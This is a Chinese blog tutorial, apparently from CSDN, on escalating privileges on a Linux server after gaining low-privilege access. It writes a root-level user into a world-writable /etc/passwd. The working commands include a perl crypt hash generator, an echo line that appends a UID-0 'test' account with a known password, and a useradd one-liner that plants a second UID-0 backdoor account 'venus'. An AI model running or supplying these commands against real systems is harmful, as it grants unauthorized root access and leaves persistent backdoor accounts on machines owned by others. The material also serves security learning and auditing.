当我们获得了某个Linux服务器的低权限之后，我们想要对该低权限账号进行[提权](https://so.csdn.net/so/search?q=%E6%8F%90%E6%9D%83&spm=1001.2101.3001.7020)，以执行更多的操作。

接下来我们的提权是利用 /etc/passwd 文件的可写入权限，导致我们写入一个其他用户进去。

首先，查看 /etc/passwd 的权限，发现任何用户都可以读写。

![](https://img-blog.csdnimg.cn/20190820184956435.png)

有关于 /etc/passwd 文件里面数据的每个属性，传送门——> [Linux下的用户和组](https://blog.csdn.net/qq_36119192/article/details/82228791#%E6%9F%A5%E7%9C%8B%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF)

我们现在要做的就是自己构造一个用户，在密码占位符处指定密码，并且UID设置为0，将其添加到 /etc/passwd 文件中。

首先，使用perl语言生成带有盐值的密码：

```
perl -le 'print crypt("password@123","addedsalt")'
```


![](https://img-blog.csdnimg.cn/20190820185556404.png)

然后执行下面这条命令，成功将test用户的信息加入 /etc/passwd 文件

```
echo "test:advwtv/9yU5yQ:0:0:User_like_root:/root:/bin/bash" >>/etc/passwd
```


![](https://img-blog.csdnimg.cn/20190820185802461.png)

以用户名：test  密码： password@123 登录主机，登录成功后，是 root 权限。

![](https://img-blog.csdnimg.cn/20190820205147934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

以下这条命令直接生成一个具有root权限的用户：venus，密码为：123qwe 。前提是这条命令的执行需要root权限。

```
useradd -p `openssl passwd -1 -salt 'user' 123qwe` -u 0 -o -g root  -G root -s /bin/bash -d /home/user venus
```


文章知识点与官方知识档案匹配，可进一步学习相关知识

[CS入门技能树](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)[Linux入门](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)[初识Linux](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)10973 人正在系统学习中